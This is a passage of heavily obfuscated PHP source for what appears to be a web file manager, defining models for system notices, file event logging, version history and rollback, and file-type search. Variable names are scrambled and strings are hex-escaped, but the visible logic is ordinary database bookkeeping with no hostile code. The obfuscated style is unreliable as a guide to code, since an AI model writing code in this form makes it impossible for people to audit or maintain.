array($¶Æù„Â[1019], $ÆÖé´€ã), $¶Æù„Â[33] => $¶Æù„Â[1800]); $æâµæ¬ = array(); $º€Ü‘“ = $this->field($¶Æù„Â[2282])->where($—ÔóË±¥)->order($¶Æù„Â[2093])->limit(50)->select(); foreach ($º€Ü‘“ as $Ç’½®à => $Á±‹¢œö) { if ($Ç’½®à > 0 && abs($Á±‹¢œö[$¶Æù„Â[200]] - $º€Ü‘“[$Ç’½®à - 1][$¶Æù„Â[200]]) < 5) { continue; } $ƒ³æØŞ¹ = json_decode($Á±‹¢œö[$¶Æù„Â[453]], !0); $Á±‹¢œö[$¶Æù„Â[2272]] = isset($ƒ³æØŞ¹[$¶Æù„Â[2272]]) ? $ƒ³æØŞ¹[$¶Æù„Â[2272]] : $¶Æù„Â[12]; unset($ƒ³æØŞ¹[$¶Æù„Â[2272]]); $ì¢¤Ÿ‚· = $this->deviceType($ƒ³æØŞ¹[$¶Æù„Â[2083]]); if (isset($æâµæ¬[$ì¢¤Ÿ‚·])) { continue; } $Á±‹¢œö[$¶Æù„Â[2276]] = IpLocation::get($Á±‹¢œö[$¶Æù„Â[2272]]); $Á±‹¢œö[$¶Æù„Â[453]] = $ƒ³æØŞ¹; $æâµæ¬[$ì¢¤Ÿ‚·] = $Á±‹¢œö; } return array_values($æâµæ¬); } public function deviceType($’•€½£Ã) { return $’•€½£Ã; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\156\157\164\x69\x63\145\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\x63\157\x6e\164\145\x6e\164", "\141\165\164\150", "\155\157\144\x65", "\x74\151\155\145", "\x74\x79\160\145", "\x6c\x65\x76\x65\x6c", "\145\156\141\142\154\145", "\x73\x6f\162\164"); public function listData($˜İçì¹œ = false, $ßµ¦‘Ü = "\x73\x6f\x72\x74", $™æÌÆÏ = false) { return parent::listData($˜İçì¹œ, $ßµ¦‘Ü, $™æÌÆÏ); } public function add($ÙéÄ©õ¸) { $ıÈåÙÀ =& $_SERVER[ùÆÎÔ“Ñ]; $¡‡‚Èµ = time(); if ($ÙéÄ©õ¸[$ıÈåÙÀ[16]] == $ıÈåÙÀ[2283]) { $¡‡‚Èµ = strtotime($ÙéÄ©õ¸[$ıÈåÙÀ[203]]); } $ÙéÄ©õ¸[$ıÈåÙÀ[203]] = $¡‡‚Èµ; return parent::insert($ÙéÄ©õ¸); } public function update($Ÿ£ë†ê€, $¯Ë¡¶ƒğ) { $€±àŸÛµ =& $_SERVER[ùÆÎÔ“Ñ]; $á¡ÁîÖŸ = $this->listData($Ÿ£ë†ê€); if (!$á¡ÁîÖŸ) { return !1; } $Ï…¡ßÀ = time(); if ($¯Ë¡¶ƒğ[$€±àŸÛµ[16]] == $€±àŸÛµ[2283]) { $Ï…¡ßÀ = strtotime($¯Ë¡¶ƒğ[$€±àŸÛµ[203]]); } $¯Ë¡¶ƒğ[$€±àŸÛµ[203]] = $Ï…¡ßÀ; return parent::update($Ÿ£ë†ê€, $¯Ë¡¶ƒğ); } public function remove($Ÿ»áµÓ×) { $Ì³á¨ìà = $this->listData($Ÿ»áµÓ×); if (!$Ì³á¨ìà || $Ì³á¨ìà[$_SERVER[ùÆÎÔ“Ñ][1290]]) { return !1; } return parent::remove($Ÿ»áµÓ×); } public function sort($é®¦ï‘ß, $ã½‘ˆİ) { return parent::update($é®¦ï‘ß, $ã½‘ˆİ); } public function enable($¢…ûêÂÏ, $áîâø‹‡) { return parent::update($¢…ûêÂÏ, array($_SERVER[ùÆÎÔ“Ñ][2284] => $áîâø‹‡)); } private function initUserOption() { $õ¬»Ò†â =& $_SERVER[ùÆÎÔ“Ñ]; $this->optionType = $õ¬»Ò†â[2285]; $this->modelType = $õ¬»Ò†â[2286]; $this->field = array($õ¬»Ò†â[2287], $õ¬»Ò†â[32], $õ¬»Ò†â[203], $õ¬»Ò†â[33], $õ¬»Ò†â[2288], $õ¬»Ò†â[751], $õ¬»Ò†â[195]); } public function userNoticeGet($®±Ñ = false) { $this->initUserOption(); return parent::listData($®±Ñ, $_SERVER[ùÆÎÔ“Ñ][399], !0); } public function userNoticeAdd($³¥’ùŸ‘) { $öª×”ª­ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initUserOption(); $…ÁşÙ‡º = $this->findByKey($öª×”ª­[2287], $³¥’ùŸ‘[$öª×”ª­[399]]); if ($…ÁşÙ‡º) { return !0; } $È¬ˆ‰ƒ = array($öª×”ª­[2287] => $³¥’ùŸ‘[$öª×”ª­[399]], $öª×”ª­[32] => $³¥’ùŸ‘[$öª×”ª­[32]], $öª×”ª­[203] => $³¥’ùŸ‘[$öª×”ª­[203]], $öª×”ª­[33] => isset($³¥’ùŸ‘[$öª×”ª­[33]]) ? $³¥’ùŸ‘[$öª×”ª­[33]] : 1, $öª×”ª­[2288] => isset($³¥’ùŸ‘[$öª×”ª­[2288]]) ? $³¥’ùŸ‘[$öª×”ª­[2288]] : 0, $öª×”ª­[751] => 0, $öª×”ª­[195] => 0); return parent::insert($È¬ˆ‰ƒ); } public function userNoticeEdit($ò¶ñºÍ¼, $’²™»ç×) { $this->initUserOption(); return parent::update($ò¶ñºÍ¼, $’²™»ç×); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\145\155\x5f\x6f\160\164\151\157\156"; protected $jsonField = array("\155\145\x6e\x75", "\x72\x6f\x6c\x65", "\162\157\154\145\107\x72\157\x75\x70", "\x72\145\x67\151\163\164", "\145\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ŠÑıÆÄ) { return "\x53\x79\x73\x74\x65\x6d\x4f\x70\164\151\157\156\137{$ŠÑıÆÄ}"; } protected function optionDefault($üÏá°ğá = '') { $ëÂşúÙÙ =& $_SERVER[ùÆÎÔ“Ñ]; if ($üÏá°ğá == $ëÂşúÙÙ[12]) { return $GLOBALS[$ëÂşúÙÙ[6]][$ëÂşúÙÙ[381]]; } } } goto fôÏÅ‡Ú™É; C®ö•‰–ê¨: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\143\145\x5f\x65\166\x65\x6e\x74"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\124\x69\155\x65", "\x74\151\155\x65", "\151\156\x73\x65\x72\x74", "\146\x75\156\143\x74\151\x6f\156"), array("\x64\x65\x73\143", '', "\x69\156\x73\x65\162\x74\x2c\x75\x70\144\x61\x74\x65\54\x73\x65\x6c\x65\143\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($§üû«¡¿, $Ñªı²ôœ, $é…âÀ¾ñ = '') { $­†ƒÎ÷ú =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->eventSave) { return; } $Ô—ù˜ó¼ = Model($­†ƒÎ÷ú[1341])->sourceInfo($§üû«¡¿); if (!$Ô—ù˜ó¼) { return !1; } if ($this->isCacheEvent($Ô—ù˜ó¼, $Ñªı²ôœ)) { return; } if ($é…âÀ¾ñ && is_string($é…âÀ¾ñ)) { $é…âÀ¾ñ = array($­†ƒÎ÷ú[1896] => $é…âÀ¾ñ); } $ÜÛüöç‹ = array($­†ƒÎ÷ú[417] => $§üû«¡¿, $­†ƒÎ÷ú[2074] => $Ô—ù˜ó¼[$­†ƒÎ÷ú[432]], $­†ƒÎ÷ú[2075] => $Ô—ù˜ó¼[$­†ƒÎ÷ú[32]], $­†ƒÎ÷ú[519] => !empty($Ô—ù˜ó¼[$­†ƒÎ÷ú[519]]) ? $Ô—ù˜ó¼[$­†ƒÎ÷ú[519]] : $­†ƒÎ÷ú[12], $­†ƒÎ÷ú[1658] => USER_ID, $­†ƒÎ÷ú[422] => $Ñªı²ôœ, $­†ƒÎ÷ú[1660] => $é…âÀ¾ñ); $this->addSystemLog($Ñªı²ôœ, $ÜÛüöç‹); unset($ÜÛüöç‹[$­†ƒÎ÷ú[2075]], $ÜÛüöç‹[$­†ƒÎ÷ú[519]]); return $this->add($ÜÛüöç‹); } private function addSystemLog($×ğİ—, $àëĞ¤ —) { $—¤ş÷Ô“ =& $_SERVER[ùÆÎÔ“Ñ]; if ($×ğİ— == $—¤ş÷Ô“[2076]) { $×ğİ— = $àëĞ¤ —[$—¤ş÷Ô“[453]][$—¤ş÷Ô“[2077]]; } else { if (in_array($×ğİ—, array($—¤ş÷Ô“[1837], $—¤ş÷Ô“[2078]))) { $×ğİ— = $àëĞ¤ —[$—¤ş÷Ô“[453]][$—¤ş÷Ô“[756]]; } } $ÊÕÒª™ = array_merge($àëĞ¤ —, array($—¤ş÷Ô“[2079] => $àëĞ¤ —[$—¤ş÷Ô“[402]], $—¤ş÷Ô“[2080] => $àëĞ¤ —[$—¤ş÷Ô“[2080]])); Hook::trigger($—¤ş÷Ô“[2081], $—¤ş÷Ô“[2082] . $×ğİ—, $àëĞ¤ —); Model($—¤ş÷Ô“[1801])->addLog($—¤ş÷Ô“[2082] . $×ğİ—, $ÊÕÒª™); } private function isCacheEvent($¿Ú™ñÚô, $¤¢Í™Ö¬) { if ($¿Ú™ñÚô[$_SERVER[ùÆÎÔ“Ñ][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($œ°ñ„Õõ, $ªûÍÅ©é) { $äãŒ¡şƒ =& $_SERVER[ùÆÎÔ“Ñ]; $íÑ»Ú¥ = Model($äãŒ¡şƒ[1341])->sourceInfo($œ°ñ„Õõ); $Ÿå“¼†‰ = array($äãŒ¡şƒ[2077] => $ªûÍÅ©é, $äãŒ¡şƒ[32] => $íÑ»Ú¥[$äãŒ¡şƒ[32]]); return $this->addEvent($œ°ñ„Õõ, $äãŒ¡şƒ[2076], $Ÿå“¼†‰); } public function eventFileEdit($º§¾Ã¾‡) { $ùìÉĞ¢ =& $_SERVER[ùÆÎÔ“Ñ]; $‡©ùüß = array($ùìÉĞ¢[2083] => $_SERVER[$ùìÉĞ¢[2084]], $ùìÉĞ¢[2085] => strtolower(ACTION)); if (isset($GLOBALS[$ùìÉĞ¢[7]][$ùìÉĞ¢[2086]])) { $‡©ùüß[$ùìÉĞ¢[2086]] = $ùìÉĞ¢[88]; } return $this->addEvent($º§¾Ã¾‡, $ùìÉĞ¢[1827], $‡©ùüß); } public function eventRecycle($ˆÍŞèŒ, $Ò½ÜÚÔ) { return $this->addEvent($ˆÍŞèŒ, $_SERVER[ùÆÎÔ“Ñ][2078], $Ò½ÜÚÔ); } public function eventRemove($„µï‘) { $ÎÙÃğÖÁ =& $_SERVER[ùÆÎÔ“Ñ]; $ËïÖ¦¥ = Model($ÎÙÃğÖÁ[1341])->sourceInfo($„µï‘); $¼Çƒë¦° = $ËïÖ¦¥[$ÎÙÃğÖÁ[32]]; return $this->addEvent($ËïÖ¦¥[$ÎÙÃğÖÁ[432]], $ÎÙÃğÖÁ[1826], $¼Çƒë¦°); } public function eventShare($ğĞí©Á², $‚ÒëÖÇ) { return $this->addEvent($ğĞí©Á², $_SERVER[ùÆÎÔ“Ñ][1837], $‚ÒëÖÇ); } public function eventMove($‚û»Ãœ™, $›¢Á€°…, $æàŞÓ) { $ü®€®á =& $_SERVER[ùÆÎÔ“Ñ]; $‘¢÷Ùƒ€ = Model($ü®€®á[1341]); $³¶Â…éì = $‘¢÷Ùƒ€->sourceInfo($‚û»Ãœ™); $ƒ…Ï›†Ã = $‘¢÷Ùƒ€->sourceInfo($›¢Á€°…); $¹ÆÂ‚€ = $‘¢÷Ùƒ€->sourceInfo($æàŞÓ); $‰§Ø’„ = array($ü®€®á[1165] => $›¢Á€°…, $ü®€®á[2087] => $ƒ…Ï›†Ã[$ü®€®á[32]], $ü®€®á[2065] => !empty($ƒ…Ï›†Ã[$ü®€®á[519]]) ? $ƒ…Ï›†Ã[$ü®€®á[519]] : $ü®€®á[12], $ü®€®á[1166] => $æàŞÓ, $ü®€®á[2088] => $¹ÆÂ‚€[$ü®€®á[32]], $ü®€®á[2089] => !empty($¹ÆÂ‚€[$ü®€®á[519]]) ? $¹ÆÂ‚€[$ü®€®á[519]] : $ü®€®á[12]); $this->addEvent($‚û»Ãœ™, $ü®€®á[557], $‰§Ø’„); $³¶Â…éì = $‘¢÷Ùƒ€->sourceInfo($‚û»Ãœ™); $‰§Ø’„ = array($ü®€®á[402] => $³¶Â…éì[$ü®€®á[402]], $ü®€®á[32] => $³¶Â…éì[$ü®€®á[32]]); $this->addEvent($›¢Á€°…, $ü®€®á[2090], $‰§Ø’„); } public function eventCopy($¦ô±Ä±º) { $this->eventCreate($¦ô±Ä±º, $_SERVER[ùÆÎÔ“Ñ][555]); } public function eventRename($„–Ö±¦ì, $„÷Öíå¢, $Œæ¸¨¡„) { $¡íÒ‘† =& $_SERVER[ùÆÎÔ“Ñ]; $ÁÚù¼¿¶ = array($¡íÒ‘†[1165] => $„÷Öíå¢, $¡íÒ‘†[1166] => $Œæ¸¨¡„); return $this->addEvent($„–Ö±¦ì, $¡íÒ‘†[1356], $ÁÚù¼¿¶); } public function eventAddComment($Ä¤à–¬, $¸¯Ÿæ×í) { return $this->addEvent($Ä¤à–¬, $_SERVER[ùÆÎÔ“Ñ][2091], $¸¯Ÿæ×í); } public function eventAddDesc($øÆıå›—, $ü¿ÑêùÓ) { return $this->addEvent($øÆıå›—, $_SERVER[ùÆÎÔ“Ñ][2092], $ü¿ÑêùÓ); } public function listBySource($å¾ƒÌ) { $†¾ë£‡¢ =& $_SERVER[ùÆÎÔ“Ñ]; $‰¡ì•÷× = Model($†¾ë£‡¢[1341])->sourceInfo($å¾ƒÌ); $ Ö·ÑÖ½ = array($†¾ë£‡¢[417] => $å¾ƒÌ); if ($‰¡ì•÷×[$†¾ë£‡¢[410]] == $†¾ë£‡¢[88]) { $ìåÙÏ˜Ä = Model($†¾ë£‡¢[1341])->listSearchChildren($å¾ƒÌ, 20000); $ìåÙÏ˜Ä[] = $å¾ƒÌ . $†¾ë£‡¢[378]; $ Ö·ÑÖ½ = array($†¾ë£‡¢[402] => array($†¾ë£‡¢[7], $ìåÙÏ˜Ä)); } $È¹Ùè× = $this->where($ Ö·ÑÖ½)->order($†¾ë£‡¢[2093])->selectPage(); if ($È¹Ùè×[$†¾ë£‡¢[366]][$†¾ë£‡¢[367]] == 0) { $È¹Ùè×[$†¾ë£‡¢[366]][$†¾ë£‡¢[367]] = 1; $È¹Ùè×[$†¾ë£‡¢[369]] = array(array($†¾ë£‡¢[417] => $å¾ƒÌ, $†¾ë£‡¢[2074] => $‰¡ì•÷×[$†¾ë£‡¢[432]], $†¾ë£‡¢[1658] => $‰¡ì•÷×[$†¾ë£‡¢[454]], $†¾ë£‡¢[422] => $†¾ë£‡¢[2094], $†¾ë£‡¢[423] => $‰¡ì•÷×[$†¾ë£‡¢[200]], $†¾ë£‡¢[1660] => $†¾ë£‡¢[12])); } return $this->eventListParse($È¹Ùè×, $å¾ƒÌ); } private function eventListParse($•Ë’µíÃ, $Ë®İÒ„ê) { $˜òĞÏ™ú =& $_SERVER[ùÆÎÔ“Ñ]; $×æÙĞŠ = $•Ë’µíÃ[$˜òĞÏ™ú[369]]; $ÈêŞ±© = array_to_keyvalue($×æÙĞŠ, $˜òĞÏ™ú[12], $˜òĞÏ™ú[402]); $¾³•À‰Á = array_to_keyvalue($×æÙĞŠ, $˜òĞÏ™ú[12], $˜òĞÏ™ú[2080]); foreach ($×æÙĞŠ as $×Ù”±Íß) { $¿¹İé‘ = $×Ù”±Íß[$˜òĞÏ™ú[453]]; if ($×Ù”±Íß[$˜òĞÏ™ú[33]] == $˜òĞÏ™ú[557] && isset($¿¹İé‘[$˜òĞÏ™ú[1165]])) { $ÈêŞ±©[] = $¿¹İé‘[$˜òĞÏ™ú[1165]] . $˜òĞÏ™ú[12]; $ÈêŞ±©[] = $¿¹İé‘[$˜òĞÏ™ú[1166]] . $˜òĞÏ™ú[12]; } if ($×Ù”±Íß[$˜òĞÏ™ú[33]] == $˜òĞÏ™ú[2090] && isset($¿¹İé‘[$˜òĞÏ™ú[402]])) { $ÈêŞ±©[] = $¿¹İé‘[$˜òĞÏ™ú[402]] . $˜òĞÏ™ú[12]; } } $ÈêŞ±© = array_merge($ÈêŞ±©, $¾³•À‰Á, array($Ë®İÒ„ê . $˜òĞÏ™ú[12])); $ÈêŞ±© = array_unique($ÈêŞ±©); $Ø§¾½í¥ = array_unique(array_to_keyvalue($×æÙĞŠ, $˜òĞÏ™ú[12], $˜òĞÏ™ú[1667])); $İÌÎºä  = Model($˜òĞÏ™ú[535])->userListInfo($Ø§¾½í¥); $ŸÈ¥³€€ = Model($˜òĞÏ™ú[826])->sourceListInfo($ÈêŞ±©, !0); foreach ($×æÙĞŠ as &$×Ù”±Íß) { if ($×Ù”±Íß[$˜òĞÏ™ú[33]] == $˜òĞÏ™ú[557] && isset($×Ù”±Íß[$˜òĞÏ™ú[453]][$˜òĞÏ™ú[1165]])) { $×Ù”±Íß[$˜òĞÏ™ú[453]][$˜òĞÏ™ú[1165]] = $ŸÈ¥³€€[$×Ù”±Íß[$˜òĞÏ™ú[453]][$˜òĞÏ™ú[1165]]]; $×Ù”±Íß[$˜òĞÏ™ú[453]][$˜òĞÏ™ú[1166]] = $ŸÈ¥³€€[$×Ù”±Íß[$˜òĞÏ™ú[453]][$˜òĞÏ™ú[1166]]]; } if ($×Ù”±Íß[$˜òĞÏ™ú[33]] == $˜òĞÏ™ú[2090] && isset($×Ù”±Íß[$˜òĞÏ™ú[453]][$˜òĞÏ™ú[402]])) { $×Ù”±Íß[$˜òĞÏ™ú[453]][$˜òĞÏ™ú[402]] = $ŸÈ¥³€€[$×Ù”±Íß[$˜òĞÏ™ú[453]][$˜òĞÏ™ú[402]]]; } $×Ù”±Íß[$˜òĞÏ™ú[86]] = $ŸÈ¥³€€[$×Ù”±Íß[$˜òĞÏ™ú[402]]]; $×Ù”±Íß[$˜òĞÏ™ú[2095]] = $ŸÈ¥³€€[$×Ù”±Íß[$˜òĞÏ™ú[2080]]]; if ($×Ù”±Íß[$˜òĞÏ™ú[33]] == $˜òĞÏ™ú[1826]) { $×Ù”±Íß[$˜òĞÏ™ú[2095]] = $×Ù”±Íß[$˜òĞÏ™ú[86]]; $×Ù”±Íß[$˜òĞÏ™ú[2080]] = $×Ù”±Íß[$˜òĞÏ™ú[2095]][$˜òĞÏ™ú[402]]; $×Ù”±Íß[$˜òĞÏ™ú[86]] = !1; $×Ù”±Íß[$˜òĞÏ™ú[402]] = $˜òĞÏ™ú[12]; } $×Ù”±Íß[$˜òĞÏ™ú[2025]] = $İÌÎºä [$×Ù”±Íß[$˜òĞÏ™ú[1667]]]; } unset($×Ù”±Íß); $•Ë’µíÃ[$˜òĞÏ™ú[369]] = $×æÙĞŠ; return $•Ë’µíÃ; } public function removeBySource($ª„à¶„–) { $ñä±§•€ = array($_SERVER[ùÆÎÔ“Ñ][417] => $ª„à¶„–); $this->where($ñä±§•€)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\x72\x63\145\137\x68\x69\x73\x74\157\162\171"; public function historyCount($©ŒŸí•ı) { $×ÃºÒ‡æ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$©ŒŸí•ı) { return array(); } if (is_string($©ŒŸí•ı) || is_int($©ŒŸí•ı)) { $©ŒŸí•ı = array($©ŒŸí•ı); } $ŠîŒò«Ö = array($×ÃºÒ‡æ[402], $×ÃºÒ‡æ[1890] => $×ÃºÒ‡æ[500]); $â×ô³İ = array($×ÃºÒ‡æ[402] => array($×ÃºÒ‡æ[7], $©ŒŸí•ı)); $õÙ€Æ¼ô = $this->field($ŠîŒò«Ö)->where($â×ô³İ)->group($×ÃºÒ‡æ[402])->select(); return array_to_keyvalue($õÙ€Æ¼ô, $×ÃºÒ‡æ[402], $×ÃºÒ‡æ[500]); } public function addHistory($¸ø¡¦÷À, $¨äŸ×Ù¹ = '') { $˜ŞˆšÀ  =& $_SERVER[ùÆÎÔ“Ñ]; $ºàù±ı¥ = array($˜ŞˆšÀ [417] => $¸ø¡¦÷À[$˜ŞˆšÀ [402]], $˜ŞˆšÀ [1658] => isset($¸ø¡¦÷À[$˜ŞˆšÀ [456]]) ? $¸ø¡¦÷À[$˜ŞˆšÀ [456]] : $¸ø¡¦÷À[$˜ŞˆšÀ [454]], $˜ŞˆšÀ [469] => $¸ø¡¦÷À[$˜ŞˆšÀ [468]], $˜ŞˆšÀ [585] => $¸ø¡¦÷À[$˜ŞˆšÀ [76]], $˜ŞˆšÀ [2096] => $¨äŸ×Ù¹); if ($GLOBALS[$˜ŞˆšÀ [6]][$˜ŞˆšÀ [89]][$˜ŞˆšÀ [1223]] >= 1) { $this->historyAutoClear($ºàù±ı¥[$˜ŞˆšÀ [402]]); $this->add($ºàù±ı¥); } Hook::trigger($˜ŞˆšÀ [2097], $ºàù±ı¥); Model($˜ŞˆšÀ [2098])->eventFileEdit($¸ø¡¦÷À[$˜ŞˆšÀ [402]]); } private function historyAutoClear($°¶˜¹áî) { $ë““×»È =& $_SERVER[ùÆÎÔ“Ñ]; $éŠ¦‘Ü² = Model($ë““×»È[771])->get($ë““×»È[1245]); $”Ò’õ¢ = $GLOBALS[$ë““×»È[6]][$ë““×»È[89]][$ë““×»È[1223]]; $¾Ïú©½Û = $éŠ¦‘Ü² == $ë““×»È[1246] ? min(5, $”Ò’õ¢) : $”Ò’õ¢; $¾Ïú©½Û = $¾Ïú©½Û <= 0 ? 0 : $¾Ïú©½Û - 1; if ($¾Ïú©½Û >= 500) { return; } $¬–Âô­È = array($ë““×»È[417] => $°¶˜¹áî); $ Š†úÍ = $this->field($ë““×»È[2099])->where($¬–Âô­È)->order($ë““×»È[2093])->select(); if (!$ Š†úÍ || $¾Ïú©½Û >= count($ Š†úÍ)) { return; } $¾Øş¦¼Ú = array_to_keyvalue($ Š†úÍ, $ë““×»È[12], $ë““×»È[399]); $¾Øş¦¼Ú = array_slice($¾Øş¦¼Ú, $¾Ïú©½Û); $°—…‘„ë = array_to_keyvalue($ Š†úÍ, $ë““×»È[12], $ë““×»È[468]); $°—…‘„ë = array_slice($°—…‘„ë, $¾Ïú©½Û); if (!$¾Øş¦¼Ú || !$°—…‘„ë) { return; } $¬–Âô­È = array($ë““×»È[419] => array($ë““×»È[7], $¾Øş¦¼Ú)); $this->where($¬–Âô­È)->delete(); Model($ë““×»È[471])->remove($°—…‘„ë); } public function listData($ºÔ áà¶) { $´¯–Ø×Ó =& $_SERVER[ùÆÎÔ“Ñ]; $ú»¶‰‚ä = array($´¯–Ø×Ó[417] => $ºÔ áà¶); $–Æ¸È¨ã = $´¯–Ø×Ó[2100]; $öøß…”° = $this->field($–Æ¸È¨ã)->where($ú»¶‰‚ä)->order($´¯–Ø×Ó[2093])->selectPage(); $this->_listAppendUser($öøß…”°[$´¯–Ø×Ó[369]]); $ÖÔ¼Ë˜Õ = Model($´¯–Ø×Ó[771])->get($´¯–Ø×Ó[1245]); $è™²¢³‡ = 5; if ($ÖÔ¼Ë˜Õ == $´¯–Ø×Ó[1246]) { $öøß…”°[$´¯–Ø×Ó[369]] = array_slice($öøß…”°[$´¯–Ø×Ó[369]], 0, $è™²¢³‡); $öøß…”°[$´¯–Ø×Ó[366]] = array($´¯–Ø×Ó[2101] => 1, $´¯–Ø×Ó[2102] => 20, $´¯–Ø×Ó[2103] => 1, $´¯–Ø×Ó[2104] => count($öøß…”°[$´¯–Ø×Ó[369]])); } return $öøß…”°; } protected function _listAppendUser(&$ÃßÉÀ©‹) { $§å©›®ø =& $_SERVER[ùÆÎÔ“Ñ]; $’¡¸²´­ = array_to_keyvalue($ÃßÉÀ©‹, $§å©›®ø[12], $§å©›®ø[1667]); $˜€ß¤Ã = Model($§å©›®ø[535])->userListInfo($’¡¸²´­); foreach ($ÃßÉÀ©‹ as &$æÌÆÃ­¸) { $»“Ì¦üæ = $æÌÆÃ­¸[$§å©›®ø[1667]]; $æÌÆÃ­¸[$§å©›®ø[454]] = $˜€ß¤Ã[$»“Ì¦üæ] ? $˜€ß¤Ã[$»“Ì¦üæ] : !1; } unset($æÌÆÃ­¸); } public function fileInfo($•õŞ€¬Ñ) { $µ¯Å¡­ =& $_SERVER[ùÆÎÔ“Ñ]; $¨†³™¢· = $this->tablePrefix; $¿‡ÌİŸ— = "{$¨†³™¢·}\151\x6f\137\146\x69\154\145\40\146\x69\x6c\145\x73\x20\x6f\156\40\146\x69\154\145\x73\x2e\x66\x69\154\x65\111\x44\x20\75\x20\x68\151\x73\164\x6f\x72\x79\x2e\146\x69\154\x65\111\104"; return $this->alias($µ¯Å¡­[2105])->where(array($µ¯Å¡­[419] => $•õŞ€¬Ñ))->join($¿‡ÌİŸ—, $µ¯Å¡­[2106])->find(); } public function removeItem($çİ’§÷¨) { $ ¥æŸ¹ =& $_SERVER[ùÆÎÔ“Ñ]; $«øÛŞ® = array($ ¥æŸ¹[419] => $çİ’§÷¨); $Û¦÷çÑŸ = $this->where($«øÛŞ®)->find(); if ($Û¦÷çÑŸ) { $ßğÙøªê = $this->where($«øÛŞ®)->delete(); Model($ ¥æŸ¹[471])->remove($Û¦÷çÑŸ[$ ¥æŸ¹[468]]); return $ßğÙøªê; } return !1; } public function removeBySource($¸¾—ëØ‹) { $»Ï•‚¸ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$¸¾—ëØ‹) { return !1; } if (!is_array($¸¾—ëØ‹)) { $¸¾—ëØ‹ = array($¸¾—ëØ‹); } $“ñÎÃ’¡ = array($»Ï•‚¸[417] => array($»Ï•‚¸[7], $¸¾—ëØ‹)); $«“ºøÂç = $this->field($»Ï•‚¸[469])->where($“ñÎÃ’¡)->select(); if ($«“ºøÂç) { $this->where($“ñÎÃ’¡)->delete(); $›Êóğå = array_to_keyvalue($«“ºøÂç, $»Ï•‚¸[12], $»Ï•‚¸[468]); Model($»Ï•‚¸[471])->remove($›Êóğå); } return !0; } public function setDetail($î”¾Òº½, $»¸‰Í±ƒ) { $·„•…¯ =& $_SERVER[ùÆÎÔ“Ñ]; return $this->where(array($·„•…¯[419] => $î”¾Òº½))->save(array($·„•…¯[2096] => $»¸‰Í±ƒ)); } public function rollbackToItem($§Ô´½†û, $£’×’üÀ) { $ß¶şÛ®í =& $_SERVER[ùÆÎÔ“Ñ]; $È£Öùí§ = Model($ß¶şÛ®í[826])->sourceInfo($§Ô´½†û); $this->addHistory($È£Öùí§, LNG($ß¶şÛ®í[2107])); $úãöéƒâ = $this->find($£’×’üÀ); $™›©œÂê = array($ß¶şÛ®í[468] => $úãöéƒâ[$ß¶şÛ®í[468]], $ß¶şÛ®í[76] => $úãöéƒâ[$ß¶şÛ®í[76]], $ß¶şÛ®í[85] => time(), $ß¶şÛ®í[456] => USER_ID); Model($ß¶şÛ®í[826])->where(array($ß¶şÛ®í[402] => $§Ô´½†û))->save($™›©œÂê); return $this->where(array($ß¶şÛ®í[419] => $£’×’üÀ))->delete(); } public function clearSame($øÂÆªæ) { $úä¦±åî =& $_SERVER[ùÆÎÔ“Ñ]; $ö …¨ÅÀ = $this->listData($øÂÆªæ); $«©ÙËŒ± = array_to_keyvalue_group($ö …¨ÅÀ, $úä¦±åî[468]); $Ñ³ÔÆó­ = array(); $ÎíĞ±¾‹ = array(); foreach ($«©ÙËŒ± as $•¸±É©û) { if (!$•¸±É©û || count($•¸±É©û) <= 1) { continue; } foreach ($•¸±É©û as $½œ·ï¸ß) { $Ñ³ÔÆó­[] = $½œ·ï¸ß[$úä¦±åî[468]]; $ÎíĞ±¾‹[] = $½œ·ï¸ß[$úä¦±åî[399]]; } } if (!$ÎíĞ±¾‹) { return; } $this->where(array($úä¦±åî[399] => array($úä¦±åî[7], $ÎíĞ±¾‹)))->delete(); Model($úä¦±åî[471])->remove($Ñ³ÔÆó­); } public function userSpace() { $ÔÖ½ØúŸ =& $_SERVER[ùÆÎÔ“Ñ]; $ŸÒÕŠã» = $this->tablePrefix; $ˆõ‡ûÂÙ = array($ÔÖ½ØúŸ[1658] => USER_ID); $ğÀî«Ã¥ = "{$ŸÒÕŠã»}\151\157\x5f\x66\x69\154\x65\40\146\x69\x6c\x65\163\40\x6f\156\40\x66\x69\154\x65\163\x2e\x66\151\x6c\145\x49\x44\40\x3d\x20\150\x69\163\164\x6f\162\x79\56\146\x69\154\x65\111\x44"; return $this->alias($ÔÖ½ØúŸ[2105])->where($ˆõ‡ûÂÙ)->join($ğÀî«Ã¥, $ÔÖ½ØúŸ[2106])->sum($ÔÖ½ØúŸ[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Áúò„ë–) { $‡œëéõÚ =& $_SERVER[ùÆÎÔ“Ñ]; $ùùü°• = KodIO::fileTypeList(); $ƒñ¿ä¡ë = $ùùü°•[$Áúò„ë–]; if (!$ƒñ¿ä¡ë) { return array(); } $ó•ş‰¼– = $ƒñ¿ä¡ë[$‡œëéõÚ[174]]; $¹ˆ¦ò³œ = $‡œëéõÚ[7]; if (!$ƒñ¿ä¡ë[$‡œëéõÚ[174]]) { $ê¨¸êò— = array_to_keyvalue($ùùü°•, $‡œëéõÚ[12], $‡œëéõÚ[174]); $ó•ş‰¼– = implode($‡œëéõÚ[50], $ê¨¸êò—); $¹ˆ¦ò³œ = $‡œëéõÚ[2108]; } $íã¹‚»“ = explode($‡œëéõÚ[50], trim($ó•ş‰¼–, $‡œëéõÚ[50])); return array($¹ˆ¦ò³œ, $íã¹‚»“); } public function listPathType($İ¾­¹Â») { $†Âş¦‡ =& $_SERVER[ùÆÎÔ“Ñ]; $ø—÷Ê¬ˆ = $this->fileTypeWhere($İ¾­¹Â»); if 